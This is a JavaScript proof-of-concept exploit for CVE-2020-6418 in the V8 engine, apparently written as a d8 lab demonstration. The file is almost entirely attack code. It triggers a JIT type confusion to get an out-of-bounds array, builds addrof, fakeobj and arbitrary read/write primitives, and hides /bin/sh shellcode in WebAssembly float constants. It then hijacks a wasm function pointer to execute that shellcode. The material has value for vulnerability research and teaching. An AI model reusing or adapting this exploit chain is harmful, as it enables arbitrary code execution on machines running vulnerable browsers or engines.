console.log("V8 sandbox escape 2024 POC by pwn2ooown");
console.log("Demostrating the exploit of CVE-2020-6418");
console.log("V8 version: " + version());
console.log("V8 commit: 970c2bf28ddb93dc17d22d83bd5cef3c85c5f6c5")

let a = [0.1, , , , , , , , , , , , , , , 0.2, 0.3, 0.4];
let oob_arr;

a.pop();
a.pop();
a.pop();
function empty() { }

function f(p) {
    a.push(Reflect.construct(function(){}, arguments, p)?4.183559238858528e-216:0);
    for (let i = 0; i < 0x10000; i++) { }
}

let p = new Proxy(Object, {
    get: () => {
        a[1] = {};
        oob_arr = [0.1];
        Obj_arr = [{}];
        return Object.prototype;
    }
});

function main(p) {
    f(p);
    for (let i = 0; i < 0x1000; i++) { }
}

for (let i = 0; i < 0x1000; i++) { main(function(){}); a.pop(); }
main(empty);
main(empty);
main(p);
let vic_arr = new Array(128); // Victim float array
vic_arr[0] = 1.1; 
let obj_arr = new Array(256); // Object array
obj_arr[0] = {};
var i64 = new BigInt64Array(1);
var f64 = new Float64Array(i64.buffer);

function ftoi(x) {
  f64[0] = x;
  return i64[0];
}

function itof(x) {
  i64[0] = x;
  return f64[0];
}

function hex(i) {
  return "0x" + i.toString(16);
}

if (oob_arr.length != 0x8000) throw "[-] oob failed, please run the script again.";
console.log("[+] oob done, oob_arr length is now "+hex(oob_arr.length));


function upper(x) {
   return x / 0x100000000n;
}

function lower(x) {
  return x % 0x100000000n;
}

// %DebugPrint(a);
// %DebugPrint(oob_arr);
// %DebugPrint(vic_arr);
// %DebugPrint(obj_arr);

function addrof(obj){
  obj_arr[0] = obj;
  return lower(ftoi(oob_arr[220]));
}
// console.log(hex(addrof(a))); // test addrof
// %DebugPrint(a);
function fakeobj(addr){
  oob_arr[220] = itof(addr);
  return obj_arr[0];
}
// console.log(fakeobj(addrof(a))); // test fakeobj
fake_map = lower(ftoi(oob_arr[19]));

forged = [itof(fake_map) , 2.2, 2.3, 2.4];

// %DebugPrint(forged);

fake_obj = fakeobj(addrof(forged) + 0x20n);

// %DebugPrint(fake_obj);

function read64(addr){
  forged[1] = itof((2n << 32n) | (addr - 8n));
  return ftoi(fake_obj[0]);
}

// console.log(hex(read64(addrof(a)))); // test read64

function write64(addr, value){
  forged[1] = itof((2n << 32n) | (addr - 8n));
  fake_obj[0] = itof(value);
}

// write64(addrof(a), 0x4141414141414141n); // test write64


// We want to hijack the fuction pointer of this wasm instance
let bytes = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,144,128,128,128,0,2,6,109,101,109,111,114,121,2,0,3,112,119,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let mod = new WebAssembly.Module(bytes);
let instance = new WebAssembly.Instance(mod);
let pwn = instance.exports.pwn;
// %DebugPrint(instance);

// This wasm instance contains the shellcode stored as double.
var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 124, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 63, 1, 61, 0, 68, 104, 47, 115, 104, 0, 88, 235, 7, 68, 104, 47, 98, 105, 110, 90, 235, 7, 68, 72, 193, 224, 32, 49, 246, 235, 7, 68, 72, 1, 208, 49, 210, 80, 235, 7, 68, 72, 137, 231, 106, 59, 144, 235, 7, 68, 88, 15, 5, 144, 144, 144, 235, 7, 26, 26, 26, 26, 26, 11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var f = wasmInstance.exports.main;
// for (let i = 0; i < 0x10000; i++) { // Don't need this
//    f();
// }
f();
// %DebugPrint(wasmInstance);

shellcode_wasm_addr = addrof(wasmInstance);

shellcode_start = read64(shellcode_wasm_addr + 0x48n);
// console.log(hex(shellcode_start));
real_sc = shellcode_start + 0x800n + 0x18n + 0x2n;
console.log("[*] Shellcode is now at",hex(real_sc));
// write64(addrof(instance) + 0x48n, 0x4141414141414141n); // control rip test
console.log("[+] Writing shellcode address to the raw function pointer in wasm instance.");
write64(addrof(instance) + 0x48n, real_sc); // control rip
%DebugPrint(instance);
%SystemBreak();

console.log("[+] Ready to fire up the shellcode!");

pwn();